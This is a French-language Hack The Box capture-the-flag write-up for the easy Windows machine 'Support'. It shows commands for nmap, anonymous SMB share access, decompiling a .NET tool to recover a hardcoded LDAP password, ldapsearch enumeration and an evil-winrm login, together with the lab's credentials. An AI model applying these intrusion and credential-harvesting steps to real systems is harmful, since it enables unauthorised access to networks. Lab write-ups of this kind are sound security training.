---
title:  "HacktheBox WriteUp : Support"
category: HackTheBox
tag: writeups
published: false
---
Support est une machine pour débutants basée sur une plateforme Windows.  
Niveau : Facile

## 1 - Enumeration Nmap

`sudo nmap 10.10.11.174 -Pn`

```
Nmap scan report for 10.10.11.174
Host is up (0.022s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-20 18:32:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
52687/tcp open  msrpc         Microsoft Windows RPC
52937/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
D'après les services disponibles (port 88, 139, 389 et 445), on peut voir qu'il s'agit d'une machine windows.

## 2 - SMB LDAP (port 445)
On voit qu'il y a un service SMB, qui est un protocole client-serveur permettant d’accéder à des fichiers/dossiers ou autres ressources du réseaux comme les imprimantes, routeurs, etc.

On utilise SMBMap, un outil qui permet aux utilisateurs d'énumérer les dossiers partagés dans un domaine entier.

`smbmap -H 10.10.11.174 -u anonymous`
```
[+] Guest session       IP: 10.10.11.174:445    Name: 10.10.11.174                                      
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
    ADMIN$                                                  NO ACCESS       Remote Admin
    C$                                                      NO ACCESS       Default share
    IPC$                                                    READ ONLY       Remote IPC
    NETLOGON                                                NO ACCESS       Logon server share 
    support-tools                                           READ ONLY       support staff tools
    SYSVOL                                                  NO ACCESS       Logon server share 
```
On essaye d'énumérer les fichiers partagés en tant qu'utilisateur invité / connection anonyme sur le dossier
support-tools vu précédemment (disponible en lecture).

`smbclient --no-pass //10.10.11.174/support-tools`
``` 
smb: \> dir
    7-ZipPortable_21.07.paf.exe            A  2880728  Sat May 28 13:19:19 2022
    npp.8.4.1.portable.x64.zip             A  5439245  Sat May 28 13:19:55 2022
    putty.exe                              A  1273576  Sat May 28 13:20:06 2022
    SysinternalsSuite.zip                  A 48102161  Sat May 28 13:19:31 2022
    UserInfo.exe.zip                       A   277499  Wed Jul 20 19:01:07 2022
    windirstat1_1_2_setup.exe              A    79171  Sat May 28 13:20:17 2022
    WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022
```
Un fichier relève notre attention au vu de son nom : UserInfo.exe.zip.  
On le récupère afin de l'analyser.
`smb: \> get UserInfo.exe.zip`

## 3 - Analyse du fichier UserInfo.exe

Après avoir dézipper le fichier, on essaye de désassembler l'exécutable à l'aide de ghidra.  
On voit qu'il s'agit d'un fichier dotnet, or il existe des outils plus adaptés pour ce type de fichier,
comme iLSpy sur linux accessible [ici](https://www.matbra.com/2020/06/18/install-avalonia-ilspy.html).


<!-- 
export PATH="$PATH:/home/misoko/.dotnet/tools"
ilspycmd -p -o <folder> <dll file>
-->
Avec la commande :  
`ilspycmd -p -o <folder> <dll file>`  
`ilspycmd -p -o support support/UserInfo.exe`  

On peut récupérer le code source à l'origine de l'exécutable.

Dans le fichier UserInfo.Services/LdapQuery.cs, on peut voir que les requêtes LDAP sont forgées en dures :  
<img src="/assets/images/WriteUps/HackTheBox/support/ldapQuery.png" width="800px" height="400px" style="display: block; margin: 0 auto"/>

On a accès à l'identifiant de connection LDAP (support\ldap), et donc le protocole utilisé.

On trouve également le fichier UserInfo.Services/Protected.cs, qui  contient le mot de passe ldap.
Seulement celui-ci est obfusqué dans un algorithme :
<img src="/assets/images/WriteUps/HackTheBox/support/passwordEncrypted.png" width="1000px" height="500px" style="display: block; margin: 0 auto"/>

Suite à cela, nous pouvons faire un script python afin de le désobfusquer : 
<img src="/assets/images/WriteUps/HackTheBox/support/passwordAlgo.png" width="800px" height="400px" style="display: block; margin: 0 auto"/>


<img src="/assets/images/WriteUps/HackTheBox/support/passwordDecrypted.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>

## 4 - Enumération LDAP
On rappelle que LDAP est un protocole logiciel pour localiser des ressources (comme des fichiers) à travers des réseaux (inter ou intranet).
Voir [ici](https://fr.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) pour plus de précisions.

On peut énumérer énormément d'information d'un domaine Windows en utilisant des requêtes LDAP.
Pour cela, la commande ldapsearch peut être utilisé de la façon suivante :
``` 
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
```
En faisant un `grep info` sur le résultat, on obtient 
```
info: Ironside47pleasure40Watchful
```
Cela est étrange car ce champ est normalement laissé vide par défault.
Il peut s'agir d'un mot de passe, mais lequel?


## 5 - Accès initial avec WinRM
Après réflexion, nous pouvons voir que le port 5985 est ouvert, ce qui veut dire que le service
de WinRM (windows remote management), un outil de gestion à distance d'un serveur Windows.
Il permet aux admin systèmes de se connecter à distance aux serveurs windows.

Un outil sous linux existe, "evil-winrm", est l'équivalant d'un winRM shell.
```
sudo gem install evil-winrm
evil-winrm -i 10.10.11.174 -u "support" -p 'Ironside47pleasure40Watchful'
```
On accède au flag user :
<img src="/assets/images/WriteUps/HackTheBox/support/userTxt.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>


## Références
- https://www.matbra.com/2020/06/18/install-avalonia-ilspy.html
- https://github.com/aerror2/ILSpy-For-MacOSX/issues/6
- https://openclassrooms.com/forum/sujet/activedirectory-difference-ou-dc-cn
- https://fr.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol
- https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
- https://github.com/Hackplayers/evil-winrm
